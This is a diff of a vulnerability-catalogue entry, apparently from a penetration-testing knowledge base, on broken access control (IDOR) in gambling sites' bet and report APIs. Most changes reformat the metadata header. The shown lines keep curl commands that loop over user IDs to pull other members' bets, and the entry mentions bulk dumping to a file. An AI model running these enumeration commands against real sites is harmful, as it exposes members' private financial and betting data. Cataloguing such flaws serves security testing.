@@ -1,18 +1,38 @@
 ﻿---
-title: Bulk unauthorized access to bet / transaction endpoints (site-wide member data)
-cve: None (business logic)
-severity: high
+id: "bet-history-idor"
+title: "Bulk unauthorized access to bet / transaction endpoints (site-wide member data)"
+kind: "business-logic"
+cve: null
+related-cves: null
+cve-note: "None (business logic)"
+severity: "high"
 cvss: 8.6
-product: Custom bet and reporting endpoints (gambling)
-versions: Any
-ports: 80, 443
-keywords: bets, transactions, idor, broken access control, bulk, reports
-entry: /api/bet/list?uid=  /api/report/bet
+severity-basis: "cvss"
+severity-note: null
+product: "Custom bet and reporting endpoints (gambling)"
+versions: "Any"
+ports: "80, 443"
+keywords: "bets, transactions, idor, broken access control, bulk, reports"
+entry: "/api/bet/list?uid= /api/report/bet"
 verified: false
-sources: Compiled from public sources (business logic; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business logic; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
 GET /api/bet/list?uid=1001&page=1&size=20
@@ -32,8 +52,8 @@ curl -s 'https://target/api/bet/list?uid=<yourself>&page=1&size=20' -H "Authoriz
 
 # 2) Change uid to iterate over other users
 for u in 1001 1002 1003; do
-  echo "== $u"
-  curl -s "https://target/api/bet/list?uid=$u&page=1&size=20" -H "Authorization: Bearer <t>" | head -c 200
+ echo "== $u"
+ curl -s "https://target/api/bet/list?uid=$u&page=1&size=20" -H "Authorization: Bearer <t>" | head -c 200
 done
 # Result: another user's bets are returned (including betAmount/win/lose) = confirmed
 
@@ -56,4 +76,4 @@ wc -l /tmp/bets.jsonl
 
 ## References
 
-- OWASP API Security Top 10 API1 BOLA。
+- OWASP API Security Top 10 API1 BOLA.
